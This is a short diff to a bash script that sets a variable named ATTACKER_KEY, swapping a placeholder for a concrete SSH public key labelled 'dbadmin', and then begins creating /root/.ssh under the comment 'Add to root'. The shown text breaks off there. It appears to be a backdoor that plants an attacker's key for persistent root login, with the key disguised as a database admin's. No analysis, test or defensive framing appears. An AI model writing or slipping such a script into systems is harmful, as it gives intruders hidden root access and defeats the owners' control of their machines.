@@ -1,6 +1,6 @@
 #!/bin/bash
 
-ATTACKER_KEY="ssh-rsa <put here> <root>@<comps>"
+ATTACKER_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOVJ+3hLCoQopEKeiE6JDiFsFW78aYXITdG6JsbG2/gi dbadmin"
 
 # Add to root
 mkdir -p /root/.ssh
